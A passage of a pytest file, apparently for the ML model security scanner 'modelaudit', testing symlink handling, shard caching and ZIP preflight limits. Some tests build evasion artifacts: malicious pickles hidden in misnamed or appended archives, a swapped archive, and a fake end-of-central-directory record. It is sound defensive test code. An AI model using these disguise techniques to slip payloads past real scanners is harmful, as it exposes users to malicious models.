    def lexical_broken_resolve(path: Path, strict: bool = False) -> Path:
        if path == broken_path:
            return Path(os.path.abspath(path))
        return original_resolve(path, strict=strict)

    def fake_stat(path: Path, *, follow_symlinks: bool = True) -> os.stat_result:
        if path == broken_path:
            return os.lstat(path)
        return original_stat(path, follow_symlinks=follow_symlinks)

    def raise_readlink(path: str | os.PathLike[str]) -> str:
        if Path(path) == broken_path:
            raise OSError("dangling link")
        return original_readlink(path)

    monkeypatch.setattr(Path, "exists", fake_exists)
    monkeypatch.setattr(Path, "resolve", lexical_broken_resolve)
    monkeypatch.setattr(Path, "stat", fake_stat)
    monkeypatch.setattr(core_module.os, "readlink", raise_readlink)

    resolved, is_hf_cache_symlink, entry_unavailable = core_module._resolve_directory_scan_target(
        broken_path,
        base_dir,
        is_hf_cache=False,
        hf_cache_root=None,
        results=results,
    )

    assert resolved is None
    assert is_hf_cache_symlink is False
    assert entry_unavailable is True
    assert any(
        issue.message == "Broken symlink encountered"
        and issue.location == str(broken_path)
        and issue.details["scan_outcome_reason"] == "directory_entry_unavailable"
        for issue in results.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_resolve_directory_scan_target_recovers_valid_relative_windows_symlink(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A valid relative link remains scannable when Windows leaves it lexically unresolved."""
    target_path = tmp_path / "blobs" / "model.bin"
    target_path.parent.mkdir()
    target_path.write_bytes(b"safe")
    link_path = tmp_path / "snapshots" / "abc123" / "model.bin"
    link_path.parent.mkdir(parents=True)
    link_path.symlink_to(Path("../../blobs/model.bin"))
    base_dir = tmp_path.resolve()
    results = core_module.create_initial_audit_result()
    original_resolve = Path.resolve
    original_stat = Path.stat

    def lexical_link_resolve(path: Path, strict: bool = False) -> Path:
        if path == link_path:
            return path.absolute()
        return original_resolve(path, strict=strict)

    def link_metadata_stat(path: Path, *, follow_symlinks: bool = True) -> os.stat_result:
        if path == link_path:
            return os.lstat(path)
        return original_stat(path, follow_symlinks=follow_symlinks)

    monkeypatch.setattr(Path, "resolve", lexical_link_resolve)
    monkeypatch.setattr(Path, "stat", link_metadata_stat)

    resolved, is_hf_cache_symlink, entry_unavailable = core_module._resolve_directory_scan_target(
        link_path,
        base_dir,
        is_hf_cache=False,
        hf_cache_root=None,
        results=results,
    )

    assert resolved == target_path.resolve()
    assert is_hf_cache_symlink is False
    assert entry_unavailable is False
    assert results.issues == []


@pytest.mark.usefixtures("requires_symlinks")
def test_resolve_directory_scan_target_classifies_symlink_loop_as_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Platform-specific ELOOP errors should not be mislabeled as missing targets."""
    cyclic_path = tmp_path / "cycle.pt"
    cyclic_path.symlink_to(cyclic_path.name)
    base_dir = tmp_path.resolve()
    results = core_module.create_initial_audit_result()
    original_resolve = Path.resolve

    def raise_loop_error(path: Path, strict: bool = False) -> Path:
        if path == cyclic_path:
            raise OSError(errno.ELOOP, "too many symbolic links")
        return original_resolve(path, strict=strict)

    monkeypatch.setattr(Path, "resolve", raise_loop_error)

    resolved, is_hf_cache_symlink, entry_unavailable = core_module._resolve_directory_scan_target(
        cyclic_path,
        base_dir,
        is_hf_cache=False,
        hf_cache_root=None,
        results=results,
    )

    assert resolved is None
    assert is_hf_cache_symlink is False
    assert entry_unavailable is True
    assert any(issue.message == "Directory entry unavailable during discovery" for issue in results.issues)
    assert all(issue.message != "Broken symlink encountered" for issue in results.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_unclassified_symlink_names_recovers_omitted_broken_link(tmp_path: Path) -> None:
    """Directory discovery should recover dangling links omitted by ``os.walk``."""
    broken_path = tmp_path / "missing.bin"
    broken_path.symlink_to("absent.bin")
    target_dir = tmp_path / "target"
    target_dir.mkdir()
    directory_link = tmp_path / "directory-link"
    directory_link.symlink_to(target_dir, target_is_directory=True)

    assert core_module._unclassified_symlink_names(str(tmp_path), [], []) == [broken_path.name]
    assert core_module._unclassified_symlink_names(
        str(tmp_path),
        [broken_path.name, directory_link.name, target_dir.name],
        [],
    ) == [broken_path.name]
    assert core_module._unclassified_symlink_names(str(tmp_path), [], [broken_path.name]) == []


@pytest.mark.usefixtures("requires_symlinks")
@pytest.mark.parametrize("classified_as_directory", [False, True], ids=["omitted", "directory"])
def test_directory_scan_reports_broken_symlink_outside_file_classification(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    classified_as_directory: bool,
) -> None:
    """A platform may omit a dangling file link or classify it as a directory."""
    broken_path = tmp_path / "missing.bin"
    broken_path.symlink_to("absent.bin")
    original_walk = os.walk

    def walk_without_broken_link(
        top: str,
        topdown: bool = True,
        onerror: Callable[[OSError], object] | None = None,
        followlinks: bool = False,
    ) -> Iterator[tuple[str, list[str], list[str]]]:
        for root, dirs, files in original_walk(top, topdown=topdown, onerror=onerror, followlinks=followlinks):
            if classified_as_directory and root == str(tmp_path) and broken_path.name not in dirs:
                dirs.append(broken_path.name)
            yield root, dirs, [name for name in files if name != broken_path.name]

    monkeypatch.setattr(core_module.os, "walk", walk_without_broken_link)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert result.success is False
    assert result.has_errors is True
    assert any(
        issue.message == "Broken symlink encountered"
        and issue.location == str(broken_path)
        and issue.details["scan_outcome_reason"] == "directory_entry_unavailable"
        for issue in result.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_continues_after_cyclic_symlink(tmp_path: Path) -> None:
    """One unavailable entry must not suppress findings from other directory members."""
    cyclic_shard = tmp_path / "checkpoint_1.pt"
    cyclic_shard.symlink_to(cyclic_shard.name)
    malicious_payload = tmp_path / "payload.pkl"
    malicious_payload.write_bytes(_build_malicious_pickle())

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert result.success is False
    assert result.has_errors is True
    assert any(issue.rule_code == "S201" for issue in result.issues)
    assert any(
        issue.message == "Directory entry unavailable during discovery"
        and issue.location == str(cyclic_shard)
        and issue.details["scan_outcome_reason"] == "directory_entry_unavailable"
        for issue in result.issues
    )


def test_scan_file_passes_shard_allowlist_to_preferred_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_selection_allowed_paths: list[list[str] | None] = []
    captured_allowed_paths: list[list[str] | None] = []
    captured_allowed_targets: list[core_module.ValidatedShardTargets | None] = []

    class DummyPreferredScanner:
        name = "dummy_preferred"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

        @staticmethod
        def can_handle(path: str) -> bool:
            return path == str(shard)

    def fake_select_preferred_scanner_id(
        path: str,
        header_format: str,
        ext: str,
        config: dict[str, Any] | None = None,
    ) -> str | None:
        del config
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return "dummy_preferred"

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyPreferredScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert scanner.name == "dummy_preferred"
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        captured_allowed_targets.append(allowed_shard_targets)
        assert core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY not in scanner.config
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    def fake_should_use_advanced_handler(
        path: str,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
    ) -> bool:
        captured_selection_allowed_paths.append(allowed_shard_paths)
        captured_allowed_targets.append(allowed_shard_targets)
        return path == str(shard)

    monkeypatch.setattr(core_module, "should_use_advanced_handler", fake_should_use_advanced_handler)
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda scanner_id: DummyPreferredScanner)
    monkeypatch.setattr(
        core_module._registry,
        "get_scanner_for_path",
        lambda *args, **kwargs: pytest.fail("preferred scanner path should not use registry fallback"),
    )
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {
                        "source_path": str(shard),
                        "path": allowed_path,
                        "device": shard.stat().st_dev,
                        "inode": shard.stat().st_ino,
                        "content_hash": "sha256:inside",
                    },
                    {"path": None, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy_preferred"
    assert captured_selection_allowed_paths == [[allowed_path]]
    assert captured_allowed_paths == [[allowed_path]]
    assert all(
        targets is not None and targets[str(shard)]["resolved_path"] == allowed_path
        for targets in captured_allowed_targets
    )


def test_directory_scan_reports_incomplete_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 1
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


def test_directory_scan_sharded_family_cache_fingerprint_tracks_sibling_shards(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    core_module.scan_model_directory_or_file(str(tmp_path))
    first_material_config = normalize_material_scan_config(captured_configs[0])
    first_fingerprint = first_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    shards[1].write_bytes(b"changed-shard-2")
    captured_configs.clear()

    core_module.scan_model_directory_or_file(str(tmp_path))
    second_material_config = normalize_material_scan_config(captured_configs[0])
    second_fingerprint = second_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    assert {member["path"] for member in first_fingerprint["members"]} == {str(shard) for shard in shards}
    assert all(
        isinstance(member.get(key), int)
        for member in first_fingerprint["members"]
        for key in ("size", "mtime_ns", "ctime_ns")
    )
    assert first_fingerprint != second_fingerprint


def test_directory_scan_deferred_shard_hash_rejects_same_size_rewrite(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Discovery timestamps must survive when grouped shard hashing is deferred."""
    shard_one = tmp_path / "checkpoint_1.pt"
    shard_two = tmp_path / "checkpoint_2.pt"
    shard_one.write_bytes(pickle.dumps({"weights": [1]}))
    shard_two.write_bytes(pickle.dumps({"weights": [2]}))
    replacement = pickle.dumps({"weights": [3]})
    assert len(replacement) == shard_two.stat().st_size
    original_stat = shard_two.stat()
    rewrite_performed = False

    def defer_hash(file_paths: list[str], **_kwargs: Any) -> dict[str, str]:
        nonlocal rewrite_performed
        shard_two.write_bytes(replacement)
        os.utime(
            shard_two,
            ns=(original_stat.st_atime_ns, original_stat.st_mtime_ns + 1_000_000_000),
        )
        rewrite_performed = True
        return {path: f"unhashable_max_file_size_{index}" for index, path in enumerate(file_paths)}

    monkeypatch.setattr(core_module, "_hash_files_by_path", defer_hash)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_enabled=False)

    assert rewrite_performed is True
    assert result.success is False
    assert core_module.determine_exit_code(result) == 2
    coverage_check = next(check for check in result.checks if check.name == "Sharded Model Coverage Check")
    assert coverage_check.details["unvalidated_shards"] == [str(shard_two)]
    assert coverage_check.details["scan_outcome_reason"] == "unvalidated_model_shards"


def test_scan_file_invalidates_cache_when_shard_sibling_changes(tmp_path: Path) -> None:
    """Caching or its safety bypass must not hide a newly malicious sibling shard."""
    shard_one = tmp_path / "checkpoint_1.pt"
    shard_two = tmp_path / "checkpoint_2.pt"
    shard_one.write_bytes(pickle.dumps({"weights": [1]}))
    shard_two.write_bytes(pickle.dumps({"weights": [2]}))
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first_result = scan_file(str(shard_one), config=config)
        cached_result = scan_file(str(shard_one), config=config)
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        shard_two.write_bytes(_build_malicious_pickle())
        second_result = scan_file(str(shard_one), config=config)

        assert first_result.success is True
        assert cached_result.success is True
        if os.name == "nt":
            assert cached_entries == 0
        else:
            assert cached_entries > 0
        assert any(issue.rule_code == "S201" for issue in second_result.issues)
        final_cache_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        if os.name == "nt":
            assert final_cache_entries == 0
        else:
            assert final_cache_entries >= cached_entries
    finally:
        reset_cache_manager()


def test_directory_scan_groups_shard_family_without_declared_total(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"checkpoint_{shard_index}.pt"
        shard_path.write_bytes(f"checkpoint-shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert fingerprint["expected_total_shards"] is None
    assert {member["path"] for member in fingerprint["members"]} == {str(shard) for shard in shards}


def test_directory_scan_content_hash_excludes_files_skipped_by_total_size_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_files: list[Path] = []
    for index in range(3):
        model_path = tmp_path / f"model-{index}.safetensors"
        model_path.write_bytes(f"model-{index}".encode())
        model_files.append(model_path.resolve())
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        result = ScanResult(scanner_name="safetensors")
        result.bytes_scanned = 2
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), max_total_size=1)

    assert len(calls) == 1
    assert result.content_hash is None
    assert result.success is False


def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_rejects_over_entry_zip_before_routing_opens_zipfile(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "over_entry.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("one.txt", "one")
        archive.writestr("two.txt", "two")

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("routing and preflight must reject before ZipFile construction")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_zipfile_open)

    result = scan_file(str(archive_path), config={"max_zip_entries": 1})

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(
        check.name == "Entry Count Limit Check"
        and check.status == CheckStatus.FAILED
        and check.details["entry_count_source"] == "central_directory_preflight"
        for check in result.checks
    )


def test_scan_file_enforces_zip_entry_preflight_for_offset_zero_hdf5(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")
    model_path = tmp_path / "appended-over-entry.h5"
    with h5py.File(model_path, "w") as h5_file:
        h5_file.attrs["model_config"] = json.dumps({"class_name": "Sequential", "config": {"layers": []}})
    with zipfile.ZipFile(model_path, "a") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
        archive.writestr("README.txt", "benign model notes")

    assert find_hdf5_signature_offset(str(model_path)) == 0
    assert zipfile.is_zipfile(model_path)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "max_zip_entries": 1,
    }

    reset_cache_manager()
    try:
        for _ in range(2):
            result = scan_file(str(model_path), config=config)

            assert result.scanner_name == "zip"
            assert result.success is False
            assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
            assert any(
                check.name == "Entry Count Limit Check"
                and check.status == CheckStatus.FAILED
                and check.rule_code == "S410"
                and check.details["entries"] == 2
                and check.details["entry_count_source"] == "central_directory_preflight"
                for check in result.checks
            )

        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        aggregate = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_zip_entries=1,
        )
        assert determine_exit_code(aggregate) == 1
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_keeps_within_limit_appended_zip_on_offset_zero_hdf5_route(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")
    model_path = tmp_path / "appended-within-entry.h5"
    with h5py.File(model_path, "w") as h5_file:
        h5_file.attrs["model_config"] = json.dumps({"class_name": "Sequential", "config": {"layers": []}})
    with zipfile.ZipFile(model_path, "a") as archive:
        archive.writestr("README.txt", "benign model notes")

    assert find_hdf5_signature_offset(str(model_path)) == 0
    assert zipfile.is_zipfile(model_path)

    result = scan_file(
        str(model_path),
        config={"max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "keras_h5"
    assert result.success is True
    assert "zip_analysis_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.rule_code == "S410" for check in result.checks)


def test_scan_file_selected_keras_still_enforces_zip_entry_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "over-entry.keras"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("config.json", "{}")
        archive.writestr("metadata.json", "{}")

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("selected ZIP-backed scanners must not bypass the container cap")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_zipfile_open)

    result = scan_file(
        str(archive_path),
        config={"scanners": ["keras_zip"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(check.name == "Entry Count Limit Check" for check in result.checks)


def test_scan_file_selected_keras_rechecks_replaced_archive_on_open_handle(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "replaced.keras"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("config.json", "{}")

    replacement_path = tmp_path / "replacement.keras"
    with zipfile.ZipFile(replacement_path, "w") as archive:
        archive.writestr("config.json", "{}")
        archive.writestr("metadata.json", "{}")

    from modelaudit.scanners.zip_scanner import ZipScanner

    original_requires_preflight_result = ZipScanner.requires_preflight_result
    replacement_installed = False

    def replace_after_initial_preflight(
        path: str,
        max_entries: int,
        max_directory_size: int | None = None,
    ) -> bool:
        nonlocal replacement_installed
        result = original_requires_preflight_result(path, max_entries, max_directory_size)
        if not replacement_installed:
            os.replace(replacement_path, archive_path)
            replacement_installed = True
        return result

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("the over-limit replacement must be rejected before ZipFile construction")

    monkeypatch.setattr(ZipScanner, "requires_preflight_result", replace_after_initial_preflight)
    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_zipfile_open)

    result = scan_file(
        str(archive_path),
        config={"scanners": ["keras_zip"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert replacement_installed is True
    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(
        check.name == "Entry Count Limit Check" and check.status == CheckStatus.FAILED and check.details["entries"] == 2
        for check in result.checks
    )


def test_scan_file_selected_weight_distribution_enforces_zip_entry_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "over-entry.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", b"data")
        archive.writestr("archive/version", b"1")

    def fail_weight_scan(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("ZIP entry preflight must reject before weight extraction")

    monkeypatch.setattr(
        "modelaudit.scanners.weight_distribution_scanner.WeightDistributionScanner.scan",
        fail_weight_scan,
    )

    result = scan_file(
        str(archive_path),
        config={"scanners": ["weight_distribution"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(
        check.name == "Entry Count Limit Check"
        and check.status == CheckStatus.FAILED
        and check.details["entry_count_source"] == "central_directory_preflight"
        for check in result.checks
    )


def test_scan_file_selected_weight_distribution_routes_within_entry_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "within-entry-limit.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", b"data")

    def fake_weight_scan(_self: Any, path: str) -> ScanResult:
        assert path == str(archive_path)
        result = ScanResult(scanner_name="weight_distribution")
        result.finish(success=True)
        return result

    monkeypatch.setattr(
        "modelaudit.scanners.weight_distribution_scanner.WeightDistributionScanner.scan",
        fake_weight_scan,
    )
    _mock_weight_distribution_scanner_availability(monkeypatch)

    result = scan_file(
        str(archive_path),
        config={"scanners": ["weight_distribution"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "weight_distribution"
    assert result.success is True
    assert not any(check.name == "Entry Count Limit Check" for check in result.checks)


def test_scan_file_selected_numpy_enforces_npz_entry_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "over-entry.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("one.npy", b"first")
        archive.writestr("two.npy", b"second")

    def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("NPZ entry preflight must reject before ZipFile construction")

    def fail_numpy_scan(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("NPZ entry preflight must reject before NumPy loading")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_zipfile_open)
    monkeypatch.setattr("modelaudit.scanners.numpy_scanner.NumPyScanner.scan", fail_numpy_scan)

    result = scan_file(
        str(archive_path),
        config={"scanners": ["numpy"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(
        check.name == "Entry Count Limit Check"
        and check.status == CheckStatus.FAILED
        and check.details["entry_count_source"] == "central_directory_preflight"
        for check in result.checks
    )


def test_scan_file_selected_numpy_preserves_within_limit_npz_selection(tmp_path: Path) -> None:
    archive_path = tmp_path / "within-entry-limit.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("weights.npy", b"safe")

    result = scan_file(
        str(archive_path),
        config={"scanners": ["numpy"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "scanner_selection"
    assert result.success is True
    assert result.metadata["skipped_scanner_id"] == "zip"
    assert not any(check.name == "Entry Count Limit Check" for check in result.checks)


def test_scan_file_selected_numpy_honors_selection_before_plain_zip_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "not-numpy.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("one.txt", "one")
        archive.writestr("two.txt", "two")

    def fail_zip_preflight(*_args: Any, **_kwargs: Any) -> bool:
        raise AssertionError("unselected plain ZIP routes must not be preflighted")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.ZipScanner.requires_preflight_result", fail_zip_preflight)

    result = scan_file(
        str(archive_path),
        config={"scanners": ["numpy"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "scanner_selection"
    assert result.success is True
    assert result.metadata["skipped_scanner_id"] == "zip"
    assert not any(check.name == "Entry Count Limit Check" for check in result.checks)


def test_scan_file_hf_bookkeeping_skip_precedes_zip_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    metadata_path = hf_home / "download" / "model.metadata"
    metadata_path.parent.mkdir(parents=True)
    metadata_path.write_text("{}")

    def fail_zip_preflight(*_args: Any, **_kwargs: Any) -> bool:
        raise AssertionError("Hugging Face bookkeeping must be skipped before ZIP preflight")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.ZipScanner.requires_preflight_result", fail_zip_preflight)

    result = scan_file(str(metadata_path), config={"cache_enabled": False})

    assert result.scanner_name == "skipped"
    assert result.success is True
    assert any(check.name == "HuggingFace Cache File Skip" for check in result.checks)


def test_scan_file_size_limit_precedes_zip_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "oversized.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("safe.txt", "safe")

    def fail_zip_preflight(*_args: Any, **_kwargs: Any) -> bool:
        raise AssertionError("file-size rejection must precede ZIP preflight")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.ZipScanner.requires_preflight_result", fail_zip_preflight)

    result = scan_file(
        str(archive_path),
        config={"max_file_size": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "size_check"
    assert result.success is False
    assert any(check.name == "File Size Limit Check" and check.status == CheckStatus.FAILED for check in result.checks)


def test_scan_file_selected_pickle_honors_selection_before_zip_preflight(tmp_path: Path) -> None:
    archive_path = tmp_path / "selected-pickle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("one.txt", "one")
        archive.writestr("two.txt", "two")

    result = scan_file(
        str(archive_path),
        config={"scanners": ["pickle"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "scanner_selection"
    assert not any(check.name == "Entry Count Limit Check" for check in result.checks)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in result.checks
    )


def test_scan_file_excluded_zip_honors_selection_before_zip_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "excluded.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("one.txt", "one")
        archive.writestr("two.txt", "two")

    def fail_zip_preflight(*_args: Any, **_kwargs: Any) -> bool:
        raise AssertionError("explicitly excluded ZIP routes must not be preflighted")

    monkeypatch.setattr("modelaudit.scanners.zip_scanner.ZipScanner.requires_preflight_result", fail_zip_preflight)

    result = scan_file(
        str(archive_path),
        config={"exclude_scanners": ["zip"], "max_zip_entries": 1, "cache_enabled": False},
    )

    assert result.scanner_name == "scanner_selection"
    assert not any(check.name == "Entry Count Limit Check" for check in result.checks)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in result.checks
    )


def test_scan_file_long_prefix_ambiguous_zip_fails_closed(tmp_path: Path) -> None:
    archive_path = tmp_path / "ambiguous-sfx.bin"
    archive_bytes = io.BytesIO()
    with zipfile.ZipFile(archive_bytes, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    real_archive = bytearray(archive_bytes.getvalue())
    real_eocd_index = real_archive.rfind(b"PK\x05\x06")
    assert real_eocd_index >= 0
    fake_empty_eocd = b"PK\x05\x06" + (b"\x00" * 18)
    real_archive[real_eocd_index + 20 : real_eocd_index + 22] = len(fake_empty_eocd).to_bytes(2, "little")
    archive_path.write_bytes((b"A" * (1024 * 1024 + 1)) + real_archive + fake_empty_eocd)

    result = scan_file(str(archive_path), config={"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(check.name == "ZIP Central Directory Preflight" for check in result.checks)


def test_scan_file_routes_prefixed_zip_with_trailing_bytes_and_misleading_extension(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.bin"
    archive_bytes = io.BytesIO()
